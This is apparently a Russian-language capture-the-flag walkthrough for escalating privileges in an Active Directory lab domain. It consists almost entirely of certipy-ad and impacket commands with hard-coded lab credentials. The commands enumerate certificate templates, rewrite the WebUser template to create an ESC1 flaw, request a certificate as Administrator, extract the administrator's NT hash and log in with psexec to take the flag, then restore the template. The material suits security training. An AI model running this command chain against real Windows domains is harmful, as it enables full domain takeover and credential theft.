Изучаем сервер
```
certipy-ad find -u 'Bob@corp.local' -p 'b0b1sH@cker' -dc-ip 10.39.150.12 -stdout -vulnerable
```
Сохраняем конфигурацию чтобы восстановить шаблон после атаки
```
certipy-ad -debug template -u Bob@corp.local -p b0b1sH@cker -template WebUser -dc-ip 10.39.150.12  -target dc.corp.local -dc-host dc.corp.local -save-configuration esc4.json
```
Перезаписываем конфигурацию на стандартную чтобы появилась уязвимость ESC1
```
certipy-ad -debug template -u Bob@corp.local -p b0b1sH@cker -template WebUser -dc-ip 10.39.150.12  -target dc.corp.local -dc-host dc.corp.local -write-default-configuration
```
Получаем сертификат администратора
```
certipy-ad req -u 'Bob@corp.local' -p 'b0b1sH@cker' -dc-ip 10.39.150.12 -ca CA-CYBER -template WebUser -upn Administrator@corp.local
```
Выполняем атаку UnpackTheHash для получения хеша
```
 certipy-ad -debug auth -pfx administrator.pfx -domain corp.local  -dc-ip 10.39.150.12 
```

Подключаемся и забираем флаг
```
impacket-psexec -hashes ':<hash>f' Administrator@10.39.150.12
```


Восстанавливаем файл 
```
certipy-ad -debug template -u Bob@corp.local -p b0b1sH@cker -template WebUser -dc-ip 10.39.150.12  -target dc.corp.local -dc-host dc.corp.local -write-configuration esc4.json -h
```